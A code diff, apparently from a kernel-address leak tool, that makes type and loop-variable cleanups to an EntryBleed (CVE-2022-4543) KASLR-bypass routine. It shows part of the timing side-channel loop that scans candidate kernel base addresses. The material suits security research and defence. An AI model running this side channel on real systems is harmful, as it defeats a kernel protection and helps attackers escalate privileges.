@@ -233,7 +233,7 @@ int detect_kernel_version() {
   snprintf(kernel_version, KERNEL_VERSION_SIZE_BUFFER, "%s %s", u.release,
            u.version);
 
-  int i;
+  unsigned long i;
   for (i = 0; i < ARRAY_SIZE(offsets); i++) {
     if (strcmp(kernel_version, offsets[i].kernel_version) == 0) {
       printf("[.] kernel version '%s' detected\n", offsets[i].kernel_version);
@@ -314,7 +314,7 @@ uint64_t sidechannel(uint64_t addr) {
 }
 
 #define STEP 0x100000ul
-#define ARR_SIZE (KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP
+#define ARR_SIZE (unsigned long)((KERNEL_BASE_MAX - KERNEL_BASE_MIN) / STEP)
 
 uint64_t leak_syscall_entry(uint64_t offset) {
   uint64_t data[ARR_SIZE] = {0};
@@ -324,8 +324,8 @@ uint64_t leak_syscall_entry(uint64_t offset) {
   int iterations = 100;
   int dummy_iterations = 5;
   int i;
-  uint64_t idx;
   for (i = 0; i < iterations + dummy_iterations; i++) {
+    uint64_t idx;
     for (idx = 0; idx < ARR_SIZE; idx++) {
       uint64_t test = SCAN_START + idx * STEP;
       syscall(104);
@@ -335,13 +335,14 @@ uint64_t leak_syscall_entry(uint64_t offset) {
     }
   }
 
-  for (i = 0; i < ARR_SIZE; i++) {
-    data[i] /= iterations;
-    if (data[i] < min) {
-      min = data[i];
-      addr = SCAN_START + i * STEP;
+  unsigned long index;
+  for (index = 0; index < ARR_SIZE; index++) {
+    data[index] /= iterations;
+    if (data[index] < min) {
+      min = data[index];
+      addr = SCAN_START + index * STEP;
     }
-    // printf("%llx %ld\n", (SCAN_START + i * STEP), data[i]);
+    // printf("%llx %ld\n", (SCAN_START + index * STEP), data[index]);
   }
 
   if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX)
@@ -394,7 +395,7 @@ unsigned long get_kernel_addr_entrybleed() {
   return addr;
 }
 
-int main(int argc, char **argv) {
+int main() {
 #if defined(__x86_64__) || defined(__amd64__)
   printf("[.] trying EntryBleed (CVE-2022-4543) ...\n");
 
